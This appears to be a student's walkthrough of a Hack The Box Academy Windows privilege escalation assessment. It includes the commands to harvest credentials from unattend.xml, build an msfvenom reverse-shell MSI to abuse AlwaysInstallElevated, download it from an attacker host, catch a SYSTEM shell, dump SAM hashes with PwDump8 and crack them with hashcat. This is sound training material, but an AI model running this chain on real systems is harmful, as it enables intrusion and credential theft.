# Windows Privilege Escalation — Skills Assessment Part II

**Platform:** Hack The Box Academy  
**Module:** Windows Privilege Escalation  
**Assessment:** Skills Assessment — Part II  
**Difficulty:** Medium  
**OS:** Windows 10 (Build 10.0.18363.592)  
**Goal:** Penetration Tester role in India | Target: January 2027

---

## Attack Chain Summary

| Step | Technique | Outcome |
|------|-----------|---------|
| 1 | RDP as `htb-student` | Initial foothold on target |
| 2 | `findstr` search across filesystem | Located `unattend.xml` in `C:\Windows\Panther\` |
| 3 | Read `unattend.xml` | Recovered cleartext credentials for `iamtheadministrator` |
| 4 | AlwaysInstallElevated abuse | Malicious `.msi` executed as SYSTEM |
| 5 | Reverse shell as SYSTEM | Read `flag.txt` from Administrator Desktop |
| 6 | PwDump8 hash dump | Extracted all local account NTLM hashes |
| 7 | Hashcat NTLM crack | Cracked `wksadmin` hash → cleartext password |

---

## Question 1 — Find Cleartext Credentials for `iamtheadministrator`

**Question:** Find the left-behind cleartext credentials for the `iamtheadministrator` domain account.

### Step 1 — RDP to Target

```bash
Hackerpatel007_1@htb[/htb]$ xfreerdp /v:10.129.43.33 /u:htb-student /p:'HTB_@cademy_stdnt!' /dynamic-resolution
```

### Step 2 — Search Filesystem for the Username

Open Command Prompt and recursively search the entire `C:\` drive for files referencing `iamtheadministrator`:

```cmd
C:\Users\htb-student> cd C:\
C:\> findstr /spin "iamtheadministrator" *.*
```

```
FINDSTR: Cannot open pagefile.sys
FINDSTR: Cannot open Windows\Panther\UnattendGC\diagerr.xml
FINDSTR: Cannot open Windows\Panther\UnattendGC\diagwrn.xml
<SNIP>
```

The results indicate files exist inside `C:\Windows\Panther\` — a directory used by Windows Setup to store installation logs and configuration files.

### Step 3 — Enumerate the Panther Directory

```cmd
C:\> cd C:\Windows\Panther
C:\Windows\Panther> dir

 Directory of C:\Windows\Panther

06/06/2021  12:20 PM    <DIR>          .
06/06/2021  12:20 PM    <DIR>          ..
05/25/2021  08:51 PM            44,525 cbs.log
05/25/2021  07:54 PM             6,032 diagerr.xml
05/25/2021  07:54 PM            19,427 diagwrn.xml
06/06/2021  12:21 PM             8,231 unattend.xml
05/25/2021  07:52 PM    <DIR>          UnattendGC
              16 File(s)      3,404,887 bytes
```

`unattend.xml` is present — this is an unattended installation answer file left behind after OS deployment. It frequently contains credentials in cleartext or base64-encoded form.

### Step 4 — Read the Unattend File

```cmd
C:\Windows\Panther> type unattend.xml
```

```xml
<!--*************************************************
Installation Notes
Location: HQ
Notes: OOB installer for Inlanefreight Windows 10 systems.
**************************************************-->

<SNIP>

<UserAccounts>
  <LocalAccounts>
    <LocalAccount wcm:action="add">
      <Password>
        <Value>HTB{flag_redacted}</Value>
```

The `<Password>` field for the `iamtheadministrator` domain account is stored in cleartext inside the unattended answer file.

> **Answer:** `HTB{flag_redacted}`

---

## Question 2 — Escalate to SYSTEM via AlwaysInstallElevated

**Question:** Escalate privileges to SYSTEM and submit the contents of flag.txt on the Administrator Desktop.

### Step 1 — Generate Malicious MSI Payload

The `AlwaysInstallElevated` registry policy, when enabled in both `HKLM` and `HKCU`, allows standard users to install `.msi` packages with SYSTEM privileges. Generate a malicious MSI with a reverse shell payload:

```bash
Hackerpatel007_1@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.72 lport=9443 -f msi > aie.msi

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of msi file: 159744 bytes
```

### Step 2 — Serve the MSI File

```bash
Hackerpatel007_1@htb[/htb]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 ...
```

### Step 3 — Transfer MSI to Target

From the established RDP session, open PowerShell and download the file:

```powershell
PS C:\Users\htb-student> curl http://10.10.14.72:8000/aie.msi -o "C:\Users\htb-student\Desktop\aie.msi"
```

### Step 4 — Start Listener on Attack Host

```bash
Hackerpatel007_1@htb[/htb]$ nc -lvnp 9443

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9443
Ncat: Listening on 0.0.0.0:9443
```

### Step 5 — Execute the MSI

Double-click `aie.msi` on the Desktop (or run `msiexec /quiet /qn /i aie.msi` from CMD).

### Step 6 — Catch SYSTEM Shell

```bash
Hackerpatel007_1@htb[/htb]$ nc -lvnp 9443

Ncat: Connection from 10.129.43.33.
Ncat: Connection from 10.129.43.33:49676.
Microsoft Windows [Version 10.0.18363.592]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

The shell returns as `NT AUTHORITY\SYSTEM` — the MSI installer ran with elevated privileges due to the `AlwaysInstallElevated` policy.

### Step 7 — Read the Flag

```cmd
C:\Windows\system32> type C:\users\Administrator\desktop\flag.txt

HTB{flag_redacted}
```

> **Answer:** `HTB{flag_redacted}`

---

## Question 3 — Dump Hashes and Crack the Disabled Admin Account

**Question:** There is 1 disabled local admin user with a weak password worth reporting. After escalating privileges, retrieve the NTLM hash for this user and crack it offline. Submit the cleartext password.

### Step 1 — Download PwDump8 to Attack Host

```bash
Hackerpatel007_1@htb[/htb]$ wget https://download.openwall.net/pub/projects/john/contrib/pwdump/pwdump8-8.2.zip
Hackerpatel007_1@htb[/htb]$ unzip pwdump8-8.2.zip

Archive:  pwdump8-8.2.zip
  inflating: pwdump8/README.txt
  inflating: pwdump8/pwdump8.exe
```

### Step 2 — Serve PwDump8

```bash
Hackerpatel007_1@htb[/htb]$ cd pwdump8/
Hackerpatel007_1@htb[/htb]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 ...
```

### Step 3 — Transfer PwDump8 to Target

From the RDP session (elevated PowerShell):

```powershell
PS C:\Users\htb-student> curl http://10.10.14.72:8000/pwdump8.exe -o "C:\Users\htb-student\Desktop\pwdump8.exe"
```

### Step 4 — Run PwDump8 from the SYSTEM Shell

Using the reverse shell obtained in Question 2 (running as SYSTEM):

```cmd
C:\Windows\system32> C:\Users\htb-student\desktop\pwdump8.exe

PwDump v8.2 - dumps windows password hashes - by Fulvio Zanetti & Andrea Petralia @ http://www.blackMath.it

Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:7796EE39FD3A9C3A1844556115AE1A54
Guest:501:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0
DefaultAccount:503:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0
WDAGUtilityAccount:504:AAD3B435B51404EEAAD3B435B51404EE:AAD797E20BA0675BBCB3E3DF3319042C
mrb3n:1001:AAD3B435B51404EEAAD3B435B51404EE:7796EE39FD3A9C3A1844556115AE1A54
htb-student:1002:AAD3B435B51404EEAAD3B435B51404EE:3C0E5D303EC84884AD5C3B7876A06EA6
wksadmin:1003:AAD3B435B51404EEAAD3B435B51404EE:HTB{hash_redacted}
```

`wksadmin` (RID 1003) is the disabled local admin account with a unique hash worth cracking.

### Step 5 — Crack the Hash with Hashcat

```bash
Hackerpatel007_1@htb[/htb]$ hashcat -m 1000 HTB{hash_redacted} /usr/share/wordlists/rockyou.txt

<SNIP>

HTB{hash_redacted}:HTB{flag_redacted}

Session..........: hashcat
Status...........: Cracked
Hash.Name........: NTLM
Time.Started.....: Mon Nov  7 15:27:12 2022 (1 sec)
Time.Estimated...: Mon Nov  7 15:27:13 2022 (0 secs)
Speed.#1.........:    15791 H/s (0.46ms)
Recovered........: 1/1 (100.00%) Digests
Progress.........: 4096/14344385 (0.03%)
```

The `wksadmin` account uses a weak password trivially cracked within one second from the rockyou wordlist. This account, even if disabled, represents a significant risk if the same password is reused elsewhere in the environment.

> **Answer:** `HTB{flag_redacted}`

---

## Flags

| Question | Answer |
|----------|--------|
| Q1 — `iamtheadministrator` cleartext password | `HTB{flag_redacted}` |
| Q2 — flag.txt (Administrator Desktop) | `HTB{flag_redacted}` |
| Q3 — `wksadmin` cleartext password | `HTB{flag_redacted}` |

---

## Lessons Learned

- **Unattend.xml** in `C:\Windows\Panther\` is left behind after unattended OS installations and is one of the first credential locations to check on any Windows target. Credentials are often stored in cleartext or base64 and can grant domain-level access.
- **AlwaysInstallElevated** is a high-severity misconfiguration. When both `HKLM` and `HKCU` registry keys are set to `1`, any standard user can execute `.msi` files with SYSTEM privileges — a trivial privilege escalation vector using a single `msfvenom` payload.
- **PwDump8** provides a reliable SAM database extraction method from an already-elevated context, returning all local account NTLM hashes including disabled accounts.
- **Disabled local admin accounts with weak passwords** are a reportable finding even when disabled — they may be reactivated, or the same password may be reused on other systems, enabling pass-the-hash or credential stuffing attacks across the environment.
- **Gold image risks** — if a weak hash is shared across many machines (same local admin password), a single cracked hash becomes a network-wide pass-the-hash vector.

---

## Attack Chain Reference

```
RDP as htb-student (standard user)
        ↓
findstr /spin across C:\ → C:\Windows\Panther\unattend.xml
        ↓
Cleartext credentials for iamtheadministrator recovered
        ↓
AlwaysInstallElevated registry keys confirmed (HKLM + HKCU)
        ↓
msfvenom → malicious aie.msi → executed via Desktop
        ↓
Reverse shell as NT AUTHORITY\SYSTEM
        ↓
flag.txt read from C:\Users\Administrator\Desktop\
        ↓
PwDump8 → all local NTLM hashes extracted
        ↓
hashcat -m 1000 → wksadmin cleartext password cracked
```

---

## Commands Reference

| Command | Purpose |
|---------|---------|
| `xfreerdp /v:<IP> /u:<user> /p:<pass> /dynamic-resolution` | RDP connection |
| `findstr /spin "iamtheadministrator" *.*` | Recursive case-insensitive file content search |
| `type C:\Windows\Panther\unattend.xml` | Read unattended install answer file |
| `msfvenom -p windows/shell_reverse_tcp lhost=<IP> lport=<PORT> -f msi > aie.msi` | Generate malicious MSI payload |
| `python3 -m http.server 8000` | Serve files from attack host |
| `curl http://<IP>:8000/aie.msi -o C:\Users\htb-student\Desktop\aie.msi` | Transfer MSI to target |
| `nc -lvnp 9443` | Start reverse shell listener |
| `C:\Users\htb-student\desktop\pwdump8.exe` | Dump local SAM hashes |
| `hashcat -m 1000 <hash> /usr/share/wordlists/rockyou.txt` | Crack NTLM hash offline |
| `type C:\users\Administrator\desktop\flag.txt` | Read flag |

---

## Registry Keys — AlwaysInstallElevated Verification

Before exploiting, confirm the misconfiguration is present in both hives:

```cmd
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
AlwaysInstallElevated    REG_DWORD    0x1

C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
AlwaysInstallElevated    REG_DWORD    0x1
```

Both must be set to `1` for the exploit to work. A value of `0` or an absent key in either hive means the policy is not in effect.

---

## MITRE ATT&CK Mapping

| Technique | Sub-Technique | Description |
|-----------|---------------|-------------|
| T1552 | T1552.001 | Unsecured Credentials: Credentials in Files (`unattend.xml`) |
| T1548 | T1548.002 | Abuse Elevation Control Mechanism: Bypass UAC |
| T1546 | T1546.015 | Event Triggered Execution: Installer Packages (AlwaysInstallElevated `.msi`) |
| T1105 | — | Ingress Tool Transfer (PwDump8, malicious MSI via HTTP) |
| T1003 | T1003.002 | OS Credential Dumping: SAM (PwDump8) |
| T1110 | T1110.002 | Brute Force: Password Cracking (Hashcat NTLM offline crack) |
| T1021 | T1021.001 | Remote Services: Remote Desktop Protocol |
| T1059 | T1059.003 | Command and Scripting Interpreter: Windows Command Shell |

---

*Part of the HTB Academy CPTS path — Windows Privilege Escalation module.*  
*Penetration Tester role in India | Target: January 2027*
